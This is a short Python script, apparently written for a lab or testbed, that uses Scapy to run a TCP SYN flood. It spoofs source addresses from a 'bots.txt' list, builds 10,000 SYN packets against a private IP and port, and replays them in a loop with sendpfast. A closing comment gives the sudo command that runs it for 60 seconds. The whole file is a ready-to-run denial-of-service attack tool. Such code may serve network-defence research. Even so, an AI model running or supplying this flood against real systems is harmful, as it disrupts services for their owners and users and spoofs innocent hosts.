from scapy.all import *
import random
import time
import ipaddress

# Scapy TCP SYN Flood (60 seconds)
TARGET_IP = "192.168.100.2"
TARGET_PORT = 50001
BOTFILE = "../bots.txt"
NUM_PACKETS = 10000
SEND_DURATION = 60
IFACE = "enp0s3"

def load_bots(filename):
    bot_ips = []
    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)
    return bot_ips

def run_tcp_syn_flood():
    bot_ips = load_bots(BOTFILE)
    packets = []

    start_build = time.perf_counter()
    for _ in range(NUM_PACKETS):

        source_ip = random.choice(bot_ips)

        ip_layer  = IP(src=source_ip, dst=TARGET_IP)
        eth_layer = Ether()
        seq_num   = 0

        tcp_layer = TCP(
            sport=RandShort(),
            dport=TARGET_PORT,
            flags='S',
            seq=seq_num,
            window=8192
        )

        packet = eth_layer / ip_layer / tcp_layer
        packets.append(packet)

    end_build = time.perf_counter()
    build_duration = end_build - start_build

    print(f"\nPacket creation completed.")
    print(f"Time to build packets: {build_duration:.4f} seconds")
    print(f"\nSending packets for {SEND_DURATION - build_duration:.4f} seconds...")

    sendpfast(packets, iface=IFACE, file_cache=True, loop=0)

    print(f"\nPacket sending finished.")

if __name__ == "__main__":
    run_tcp_syn_flood()

# timeout -s INT 60 sudo PYTHONPATH=$HOME/scapy python3 scapy_test_tcp_syn_flood.py